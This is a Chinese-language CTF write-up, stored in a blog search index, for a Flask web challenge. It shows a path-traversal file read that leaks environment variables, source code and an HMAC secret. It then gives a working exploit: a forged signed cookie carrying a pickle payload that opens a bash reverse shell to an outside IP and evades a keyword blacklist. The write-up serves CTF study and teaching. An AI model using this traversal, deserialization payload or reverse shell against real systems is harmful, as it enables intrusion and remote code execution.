<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="ycb-wp"><a href="#ycb-wp" class="headerlink" title="ycb wp"></a>ycb wp</h1><h2 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">/lyrics?lyrics=<br></code></pre></td></tr></table></figure><p>这个诗歌路由可以读文件</p><p>读取&#x2F;proc&#x2F;self&#x2F;environ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">KUBERNETES<span class="hljs-built_in">_</span>SERVICE<span class="hljs-built_in">_</span>PORT=443KUBERNETES<span class="hljs-built_in">_</span>PORT=tcp://10.168.0.1:443MAIL=/var/mail/playerUSER=playerHOSTNAME=endpoint-1588102d5f4542e89e9df25bff3c6ed6-0SHLVL=0PYTHON<span class="hljs-built_in">_</span>PIP<span class="hljs-built_in">_</span>VERSION=22.2.2HOME=/home/playerGPG<span class="hljs-built_in">_</span>KEY=A035C8C19219BA821ECEA86B64E628F8D684696DDASINIT=DASINITLOGNAME=player<span class="hljs-built_in">_</span>=/bin/suPYTHON<span class="hljs-built_in">_</span>GET<span class="hljs-built_in">_</span>PIP<span class="hljs-built_in">_</span>URL=https://github.com/pypa/get-pip/raw/5eaac1050023df1f5c98b173b248c260023f2278/public/get-pip.pyKUBERNETES<span class="hljs-built_in">_</span>PORT<span class="hljs-built_in">_</span>443<span class="hljs-built_in">_</span>TCP<span class="hljs-built_in">_</span>ADDR=10.168.0.1PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binKUBERNETES<span class="hljs-built_in">_</span>PORT<span class="hljs-built_in">_</span>443<span class="hljs-built_in">_</span>TCP<span class="hljs-built_in">_</span>PORT=443KUBERNETES<span class="hljs-built_in">_</span>PORT<span class="hljs-built_in">_</span>443<span class="hljs-built_in">_</span>TCP<span class="hljs-built_in">_</span>PROTO=tcpLANG=C.UTF-8DASFLAG=notSHELL=/bin/shPYTHON<span class="hljs-built_in">_</span>VERSION=3.10.7PYTHON<span class="hljs-built_in">_</span>SETUPTOOLS<span class="hljs-built_in">_</span>VERSION=63.2.0KUBERNETES<span class="hljs-built_in">_</span>SERVICE<span class="hljs-built_in">_</span>PORT<span class="hljs-built_in">_</span>HTTPS=443KUBERNETES<span class="hljs-built_in">_</span>PORT<span class="hljs-built_in">_</span>443<span class="hljs-built_in">_</span>TCP=tcp://10.168.0.1:443PWD=/usr/etc/appKUBERNETES<span class="hljs-built_in">_</span>SERVICE<span class="hljs-built_in">_</span>HOST=10.168.0.1PYTHON<span class="hljs-built_in">_</span>GET<span class="hljs-built_in">_</span>PIP<span class="hljs-built_in">_</span>SHA256=5aefe6ade911d997af080b315ebcb7f882212d070465df544e1175ac2be519b4<br></code></pre></td></tr></table></figure><p>读源码app.py</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">/lyrics?lyrics=../app.py<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, make_response, request, render_template<br><br><span class="hljs-comment"># 假设这些模块和变量已经定义好了</span><br><span class="hljs-keyword">from</span> config.secret_key <span class="hljs-keyword">import</span> secret_code<br><span class="hljs-keyword">from</span> cookie <span class="hljs-keyword">import</span> set_cookie, cookie_check, get_cookie<br><br>app = Flask(__name__)<br>app.secret_key = random.randbytes(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserData</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username</span>):<br>        self.username = username<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Waf</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># 检查输入的数据是否包含黑名单中的关键词</span><br>    blacklist = [<span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;secret&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;file&#x27;</span>, <span class="hljs-string">b&#x27;compile&#x27;</span>, <span class="hljs-string">b&#x27;open&#x27;</span>, <span class="hljs-string">b&#x27;os.popen&#x27;</span>]<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> word.lower() <span class="hljs-keyword">in</span> data.lower():<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/lyrics&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lyrics</span>():<br>    query = request.args.get(<span class="hljs-string">&quot;lyrics&quot;</span>)<br>    path = os.path.join(os.getcwd(), <span class="hljs-string">&quot;lyrics&quot;</span>, query)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path) <span class="hljs-keyword">as</span> f:<br>            res = f.read()<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No lyrics found&quot;</span><br><br>    resp = make_response(res)<br>    resp.headers[<span class="hljs-string">&quot;Content-Type&quot;</span>] = <span class="hljs-string">&#x27;text/plain; charset=UTF-8&#x27;</span><br>    <span class="hljs-keyword">return</span> resp<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>        user = UserData(username)<br>        res = &#123;<span class="hljs-string">&quot;username&quot;</span>: user.username&#125;<br>        <span class="hljs-keyword">return</span> set_cookie(<span class="hljs-string">&quot;user&quot;</span>, res, secret=secret_code)<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/board&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">board</span>():<br>    <span class="hljs-comment"># 检查Cookie是否合法</span><br>    <span class="hljs-keyword">if</span> cookie_check(<span class="hljs-string">&quot;user&quot;</span>, secret=secret_code):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Nope, invalid code get out!&quot;</span><br><br>    data = get_cookie(<span class="hljs-string">&quot;user&quot;</span>, secret=secret_code)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">bytes</span>):<br>        data = pickle.loads(data)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=<span class="hljs-string">&quot;guest&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> data[<span class="hljs-string">&quot;username&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, name=data[<span class="hljs-string">&quot;username&quot;</span>])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=data[<span class="hljs-string">&quot;username&quot;</span>])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.chdir(os.path.dirname(__file__))<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure><p>开始傻逼了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 假设这些模块和变量已经定义好了</span><br><span class="hljs-keyword">from</span> config.secret_key <span class="hljs-keyword">import</span> secret_code<br><span class="hljs-keyword">from</span> cookie <span class="hljs-keyword">import</span> set_cookie, cookie_check, get_cookie<br></code></pre></td></tr></table></figure><p>这两个文件一直没读</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">/lyrics?lyrics=../config/secret<span class="hljs-built_in">_</span>key.py<br>/lyrics?lyrics=../cookie.py<br></code></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs tex">secret<span class="hljs-built_in">_</span>code = &quot;EnjoyThePlayTime123456&quot;<br><br>import base64<br>import hashlib<br>import hmac<br>import pickle<br>from flask import make<span class="hljs-built_in">_</span>response, request<br><br><span class="hljs-params">#</span> 将字符串转换为字节<br>def tob(s, enc=&#x27;utf8&#x27;):<br>    return s.encode(enc) if isinstance(s, str) else bytes(s)<br><br><span class="hljs-params">#</span> 将字节转换为字符串<br>def touni(s, enc=&#x27;utf8&#x27;, err=&#x27;strict&#x27;):<br>    return s.decode(enc, err) if isinstance(s, bytes) else s<br><br><span class="hljs-params">#</span> 编码 Cookie 值<br>def cookie<span class="hljs-built_in">_</span>encode(data, key):<br>    msg = base64.b64encode(pickle.dumps(data, protocol=-1))<br>    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())<br>    return tob(&#x27;!&#x27;) + sig + tob(&#x27;?&#x27;) + msg<br><br><span class="hljs-params">#</span> 解码 Cookie 值<br>def cookie<span class="hljs-built_in">_</span>decode(data, key):<br>    data = tob(data)<br>    if cookie<span class="hljs-built_in">_</span>is<span class="hljs-built_in">_</span>encoded(data):<br>        sig, msg = data.split(tob(&#x27;?&#x27;), 1)<br>        if <span class="hljs-built_in">_</span>lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):<br>            return pickle.loads(base64.b64decode(msg))<br>    return None<br><br><span class="hljs-params">#</span> 检查 Cookie 值是否符合 WAF 规则<br>def waf(data):<br>    blacklist = [b&#x27;R&#x27;, b&#x27;secret&#x27;, b&#x27;eval&#x27;, b&#x27;file&#x27;, b&#x27;compile&#x27;, b&#x27;open&#x27;, b&#x27;os.popen&#x27;]<br>    return any(word in data for word in blacklist)<br><br><span class="hljs-params">#</span> 检查 Cookie 是否有效<br>def cookie<span class="hljs-built_in">_</span>check(key, secret=None):<br>    value = request.cookies.get(key)<br>    if value:<br>        data = tob(value)<br>        if cookie<span class="hljs-built_in">_</span>is<span class="hljs-built_in">_</span>encoded(data):<br>            sig, msg = data.split(tob(&#x27;?&#x27;), 1)<br>            if <span class="hljs-built_in">_</span>lscmp(sig[1:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):<br>                res = base64.b64decode(msg)<br>                if waf(res):<br>                    return True<br>    return False<br><br><span class="hljs-params">#</span> 判断 Cookie 是否编码过<br>def cookie<span class="hljs-built_in">_</span>is<span class="hljs-built_in">_</span>encoded(data):<br>    return bool(data.startswith(tob(&#x27;!&#x27;)) and tob(&#x27;?&#x27;) in data)<br><br><span class="hljs-params">#</span> 比较两个字节序列是否相等<br>def <span class="hljs-built_in">_</span>lscmp(a, b):<br>    return not sum(0 if x == y else 1 for x, y in zip(a, b)) and len(a) == len(b)<br><br><span class="hljs-params">#</span> 设置 Cookie<br>def set<span class="hljs-built_in">_</span>cookie(name, value, secret=None, **options):<br>    if secret:<br>        value = touni(cookie<span class="hljs-built_in">_</span>encode((name, value), secret))<br>        resp = make<span class="hljs-built_in">_</span>response(&quot;success&quot;)<br>        resp.set<span class="hljs-built_in">_</span>cookie(name, value, max<span class="hljs-built_in">_</span>age=3600, **options)<br>        return resp<br>    elif not isinstance(value, str):<br>        raise TypeError(&#x27;Secret key missing for non-string Cookie.&#x27;)<br>    if len(value) &gt; 4096:<br>        raise ValueError(&#x27;Cookie value too long.&#x27;)<br><br><span class="hljs-params">#</span> 获取 Cookie<br>def get<span class="hljs-built_in">_</span>cookie(key, default=None, secret=None):<br>    value = request.cookies.get(key)<br>    if secret and value:<br>        dec = cookie<span class="hljs-built_in">_</span>decode(value, secret)<br>        return dec[1] if dec and dec[0] == key else default<br>    return value or default<br><br></code></pre></td></tr></table></figure><p>那么思路很明确了</p><p>就是用那个密钥伪造一个cookie用来pickle反序列化</p><p>waf ban掉了一下但是不太影响</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pyth">def waf(data):<br>    blacklist = [b&#x27;R&#x27;, b&#x27;secret&#x27;, b&#x27;eval&#x27;, b&#x27;file&#x27;, b&#x27;compile&#x27;, b&#x27;open&#x27;, b&#x27;os.popen&#x27;]<br>    return any(word in data for word in blacklist)<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs pyth">import pickle<br><br>from flask import Flask<br><br>from cookie import set_cookie, cookie_check, get_cookie<br><br><br>class UserData:<br>    def __init__(self, username):<br>        self.username = username<br><br>secret_code = &quot;EnjoyThePlayTime123456&quot;<br>username = &quot;111&quot;<br>user = UserData(username)<br>res = b&#x27;&#x27;&#x27;(cos<br>system<br>S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/39.107.77.142/3389 0&gt;&amp;1&#x27;&quot;<br>o.&#x27;&#x27;&#x27;<br># res = &#123;&quot;username&quot;: pld&#125;<br><br><br># 创建Flask应用<br>app = Flask(__name__)<br><br>@app.route(&#x27;/set_cookie&#x27;, methods=[&#x27;GET&#x27;])<br>def set_cookie_route():<br>    response = set_cookie(&quot;user&quot;, res, secret=secret_code)<br>    return response<br><br>@app.route(&quot;/board&quot;, methods=[&#x27;GET&#x27;])<br>def board():<br>    # 检查Cookie是否合法<br>    if cookie_check(&quot;user&quot;, secret=secret_code):<br>        return &quot;Nope, invalid code get out!&quot;<br><br>    data = get_cookie(&quot;user&quot;, secret=secret_code)<br>    if isinstance(data, bytes):<br>        data = pickle.loads(data)<br><br>    # if &quot;username&quot; not in data:<br>    #     return render_template(&#x27;user.html&#x27;, name=&quot;guest&quot;)<br>    #<br>    # if data[&quot;username&quot;] == &quot;admin&quot;:<br>    #     return render_template(&#x27;admin.html&#x27;, name=data[&quot;username&quot;])<br>    # else:<br>    #     return render_template(&#x27;user.html&#x27;, name=data[&quot;username&quot;])<br><br>if __name__ == &#x27;__main__&#x27;:<br>    app.run(debug=True)<br></code></pre></td></tr></table></figure><p>生成cookie然后发送到&#x2F;board路由即可</p><p><img src="/images/image-20240827123127111-1726300638419-24.png" alt="image-20240827123127111"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
